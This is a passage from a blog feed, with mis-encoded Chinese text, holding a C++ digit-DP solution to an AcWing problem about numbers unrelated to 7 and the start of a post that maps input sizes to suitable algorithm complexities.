class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> å–æ¨¡åè¾“å‡ºã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>T</mi><mo>â‰¤</mo><mn>50</mn></mrow><annotation encoding="application/x-tex">1 \le T \le 50</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">50</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>L</mi><mo>â‰¤</mo><mi>R</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>18</mn></msup></mrow><annotation encoding="application/x-tex">1 \le L \le R \le 10^{18}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">18</span></span></span></span></span></span></span></span></span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>31 910 1117 17</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>2362210</code></pre><h3 id="é¢˜è§£-4">é¢˜è§£</h3><blockquote><p>å¤§ä½“çœ‹æ‡‚äº†ï¼Œè·Ÿç€yæ€»æ•²äº†ä¸€éï¼Œç´¯ï¼Œæš‚æ—¶æ²¡åŠ¨åŠ›ç»§ç»­å’¯â€¦â€¦</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">20</span>, N = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">F</span> &#123;</span><br><span class="line">  <span class="type">int</span> s0, s1, s2;</span><br><span class="line">&#125;f[kN][<span class="number">10</span>][<span class="number">7</span>][<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> power7[kN], power9[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mod</span><span class="params">(LL x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (x % y + y) % y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">7</span>) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">auto</span> &amp;v = f[<span class="number">1</span>][i][i % <span class="number">7</span>][i % <span class="number">7</span>];</span><br><span class="line">    v.s0++, v.s1 += i, v.s2 += i * i;</span><br><span class="line">  &#125;</span><br><span class="line">  LL power = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; kN; i++, power *= <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (j == <span class="number">7</span>) <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> a = <span class="number">0</span>; a &lt; <span class="number">7</span>; a++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> b = <span class="number">0</span>; b &lt; <span class="number">7</span>; b++) &#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt;= <span class="number">9</span>; k++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (k == <span class="number">7</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">auto</span> &amp;v1 = f[i][j][a][b], &amp;v2 = f[i - <span class="number">1</span>][k][<span class="built_in">mod</span>(a - j * power, <span class="number">7</span>)][<span class="built_in">mod</span>(b - j, <span class="number">7</span>)];</span><br><span class="line">            v1.s0 = <span class="built_in">mod</span>(v1.s0 + v2.s0, N);</span><br><span class="line">            v1.s1 = <span class="built_in">mod</span>(v1.s1 + v2.s1 + j * (power % N) % N * v2.s0, N);</span><br><span class="line">            v1.s2 = <span class="built_in">mod</span>(v1.s2 + </span><br><span class="line">                        j * j * (power % N) % N * (power % N) % N * v2.s0 + </span><br><span class="line">                        <span class="number">2</span> * j * power % N * v2.s1 + </span><br><span class="line">                        v2.s2,</span><br><span class="line">                        N);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  power7[<span class="number">0</span>] = power9[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; kN; i++) &#123;</span><br><span class="line">    power7[i] = power7[i - <span class="number">1</span>] * <span class="number">10</span> % <span class="number">7</span>;</span><br><span class="line">    power9[i] = power9[i - <span class="number">1</span>] * <span class="number">10ll</span> % N;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">F <span class="title">get</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> s0 = <span class="number">0</span>, s1 = <span class="number">0</span>, s2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> x = <span class="number">0</span>; x &lt; <span class="number">7</span>; x++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> y = <span class="number">0</span>; y &lt; <span class="number">7</span>; y++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (x != a &amp;&amp; y != b) &#123;</span><br><span class="line">        <span class="keyword">auto</span> v = f[i][j][x][y];</span><br><span class="line">        s0 = (s0 + v.s0) % N;</span><br><span class="line">        s1 = (s1 + v.s1) % N;</span><br><span class="line">        s2 = (s2 + v.s2) % N;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;s0, s1, s2&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dp</span><span class="params">(LL n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!n) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  LL bak_n = n % N;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    nums.<span class="built_in">push_back</span>(n % <span class="number">10</span>);</span><br><span class="line">    n /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  LL last_a = <span class="number">0</span>, last_b = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = nums.<span class="built_in">size</span>() - <span class="number">1</span>; ~i; i--) &#123;</span><br><span class="line">    <span class="type">int</span> x = nums[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; x; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (j == <span class="number">7</span>) <span class="keyword">continue</span>;</span><br><span class="line">      <span class="type">int</span> a = <span class="built_in">mod</span>(-last_a * power7[i + <span class="number">1</span>], <span class="number">7</span>);</span><br><span class="line">      <span class="type">int</span> b = <span class="built_in">mod</span>(-last_b, <span class="number">7</span>);</span><br><span class="line">      <span class="keyword">auto</span> v = <span class="built_in">get</span>(i + <span class="number">1</span>, j, a, b);</span><br><span class="line">      res = <span class="built_in">mod</span>(res + </span><br><span class="line">                (last_a % N) * (last_a % N) % N * power9[i + <span class="number">1</span>] % N * power9[i + <span class="number">1</span>] % N * v.s0 % N + </span><br><span class="line">                <span class="number">2</span> * last_a % N *power9[i + <span class="number">1</span>] % N * v.s1 + </span><br><span class="line">                v.s2,</span><br><span class="line">                N);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">7</span>) <span class="keyword">break</span>;</span><br><span class="line">    last_a = last_a * <span class="number">10</span> + x;</span><br><span class="line">    last_b += x;</span><br><span class="line">    <span class="keyword">if</span> (!i &amp;&amp; last_a % <span class="number">7</span> &amp;&amp; last_b % <span class="number">7</span>)</span><br><span class="line">      res = (res + bak_n * bak_n) % N;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">init</span>();</span><br><span class="line">  <span class="type">int</span> T;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">  <span class="keyword">while</span> (T--) &#123;</span><br><span class="line">    LL l, r;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>, &amp;l, &amp;r);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">mod</span>(<span class="built_in">dp</span>(r) - <span class="built_in">dp</span>(l - <span class="number">1</span>), N));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
          <category> AcWingç®—æ³•æé«˜è¯¾ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°ä½DP </tag>
            
            <tag> DP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬7è®² æ—¶ç©ºå¤æ‚åº¦åˆ†æ</title>
      <link href="/2022/11/28/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-7-%E6%97%B6%E7%A9%BA%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%88%86%E6%9E%90/"/>
      <url>/2022/11/28/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-7-%E6%97%B6%E7%A9%BA%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>ä¸€èˆ¬ACMæˆ–è€…ç¬”è¯•é¢˜çš„æ—¶é—´é™åˆ¶æ˜¯1ç§’æˆ–2ç§’ã€‚<br>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒC++ä»£ç ä¸­çš„æ“ä½œæ¬¡æ•°æ§åˆ¶åœ¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>7</mn></msup><mo>âˆ¼</mo><mn>1</mn><msup><mn>0</mn><mn>8</mn></msup></mrow><annotation encoding="application/x-tex">10^7\sim 10^8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span></span></span></span> ä¸ºæœ€ä½³ã€‚</p><span id="more"></span><h1 id="ç”±æ•°æ®èŒƒå›´åæ¨ç®—æ³•å¤æ‚åº¦ä»¥åŠç®—æ³•å†…å®¹">ç”±æ•°æ®èŒƒå›´åæ¨ç®—æ³•å¤æ‚åº¦ä»¥åŠç®—æ³•å†…å®¹</h1><p>ä¸‹é¢ç»™å‡ºåœ¨ä¸åŒæ•°æ®èŒƒå›´ä¸‹ï¼Œä»£ç çš„æ—¶é—´å¤æ‚åº¦å’Œç®—æ³•è¯¥å¦‚ä½•é€‰æ‹©ï¼š</p><table><thead><tr><th>æ•°æ®èŒƒå›´</th><th>æ—¶é—´å¤æ‚åº¦</th><th>ç®—æ³•</th></tr></thead><tbody><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>â‰¤</mo><mn>30</mn></mrow><annotation encoding="application/x-tex">n\le 30</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">30</span></span></span></span></td><td>æŒ‡æ•°çº§åˆ«</td><td>dfs+å‰ªæã€çŠ¶æ€å‹ç¼©dp</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>â‰¤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">n\le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td><td>floydã€dpã€é«˜æ–¯æ¶ˆå…ƒ</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">n\le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td><td>dpã€äºŒåˆ†ã€æœ´ç´ ç‰ˆdijkstraã€æœ´ç´ ç‰ˆPrimã€Bellman-Ford</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>â‰¤</mo><mn>10</mn><mo separator="true">,</mo><mn>000</mn></mrow><annotation encoding="application/x-tex">n\le 10,000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>â‹…</mo><msqrt><mi>n</mi></msqrt><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\cdot \sqrt n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0503em;vertical-align:-0.25em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8003em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="padding-left:0.833em;">n</span></span><span style="top:-2.7603em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2397em;"><span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td><td>å—çŠ¶é“¾è¡¨ã€åˆ†å—ã€è«é˜Ÿ</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>â‰¤</mo><mn>100</mn><mo separator="true">,</mo><mn>000</mn></mrow><annotation encoding="application/x-tex">n\le 100,000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">100</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>â‹…</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\cdot logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td>å„ç§sortã€çº¿æ®µæ ‘ã€æ ‘çŠ¶æ•°ç»„ã€set/mapã€heapã€ã€æ‹“æ‰‘æ’åºã€dijkstra+heapã€prim+heapã€Kruskalã€spfaã€æ±‚å‡¸åŒ…ã€æ±‚åŠå¹³é¢äº¤ã€äºŒåˆ†ã€CDQåˆ†æ²»ã€æ•´ä½“äºŒåˆ†ã€åç¼€æ•°ç»„ã€æ ‘é“¾å‰–åˆ†ã€åŠ¨æ€æ ‘</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>â‰¤</mo><mn>1</mn><mo separator="true">,</mo><mn>000</mn><mo separator="true">,</mo><mn>000</mn></mrow><annotation encoding="application/x-tex">n\le 1,000,000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br>å¸¸æ•°è¾ƒå°çš„<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>â‹…</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\cdot logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td>å•è°ƒé˜Ÿåˆ—ã€ hashã€åŒæŒ‡é’ˆæ‰«æã€å¹¶æŸ¥é›†ï¼Œkmpã€ACè‡ªåŠ¨æœº<br>sortã€æ ‘çŠ¶æ•°ç»„ã€heapã€dijkstraã€spfa</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math 